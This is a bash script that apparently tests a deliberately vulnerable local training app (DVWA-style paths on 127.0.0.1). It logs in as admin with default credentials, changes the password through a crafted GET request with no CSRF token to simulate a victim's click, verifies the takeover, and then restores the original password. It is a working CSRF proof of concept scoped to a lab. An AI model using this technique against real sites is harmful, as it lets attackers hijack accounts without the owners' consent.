#!/bin/bash
TARGET="http://127.0.0.1:8080"

# First, let's login and get a session
rm -f /tmp/pw_cookies.txt
resp=$(curl -s -c /tmp/pw_cookies.txt "$TARGET/login.php")
token=$(echo "$resp" | grep -oP "value='\K[a-f0-9]+" | head -1)
login_resp=$(curl -s -L -b /tmp/pw_cookies.txt -c /tmp/pw_cookies2.txt \
    -d "username=admin&password=password&user_token=${token}&Login=Login" \
    "$TARGET/login.php")

echo "=== Test 1: Change password via GET (simulate CSRF) ==="
echo ""
# Simulate a victim clicking a crafted link
change_resp=$(curl -s -b /tmp/pw_cookies2.txt \
    "$TARGET/vulnerabilities/csrf/?password_new=csrf_test&password_conf=csrf_test&Change=Change" 
)
echo "Response snippet:"
echo "$change_resp" | grep -i "message\|success\|changed\|error\|password\|New password" | head -10
echo ""

# Now test logging in with new password
echo "=== Test 2: Login with new password (csrf_test) ==="
echo ""
rm -f /tmp/newpw2_cookies.txt
new_resp=$(curl -s -c /tmp/newpw2_cookies.txt "$TARGET/login.php")
new_token=$(echo "$new_resp" | grep -oP "value='\K[a-f0-9]+" | head -1)
new_login=$(curl -s -L -b /tmp/newpw2_cookies.txt \
    -d "username=admin&password=csrf_test&user_token=${new_token}&Login=Login" \
    "$TARGET/login.php")
if echo "$new_login" | grep -q "Welcome"; then
    echo "[!] SUCCESS - Password changed to 'csrf_test' via GET request without CSRF token!"
else
    echo "[-] Login with new password failed"
    # Check if old password still works
    rm -f /tmp/oldpw2_cookies.txt
    old_resp2=$(curl -s -c /tmp/oldpw2_cookies.txt "$TARGET/login.php")
    old_token2=$(echo "$old_resp2" | grep -oP "value='\K[a-f0-9]+" | head -1)
    old_login2=$(curl -s -L -b /tmp/oldpw2_cookies.txt \
        -d "username=admin&password=password&user_token=${old_token2}&Login=Login" \
        "$TARGET/login.php")
    if echo "$old_login2" | grep -q "Welcome"; then
        echo "[+] Old password still works"
    else
        echo "[-] Neither password works"
    fi
fi
echo ""

# Reset password back to original
echo "=== Test 3: Reset password back to 'password' ==="
echo ""
# Need to be logged in to change - let's use the new password session if it worked
if echo "$new_login" | grep -q "Welcome"; then
    change_back=$(curl -s -b /tmp/newpw2_cookies.txt \
        "$TARGET/vulnerabilities/csrf/?password_new=password&password_conf=password&Change=Change")
    echo "Password reset response:"
    echo "$change_back" | grep -i "message\|success\|changed" | head -10
    
    # Verify old password works again
    rm -f /tmp/verify_cookies.txt
    vresp=$(curl -s -c /tmp/verify_cookies.txt "$TARGET/login.php")
    vtoken=$(echo "$vresp" | grep -oP "value='\K[a-f0-9]+" | head -1)
    vlogin=$(curl -s -L -b /tmp/verify_cookies.txt \
        -d "username=admin&password=password&user_token=${vtoken}&Login=Login" \
        "$TARGET/login.php")
    if echo "$vlogin" | grep -q "Welcome"; then
        echo "[+] Password reset to 'password' successful!"
    fi
fi

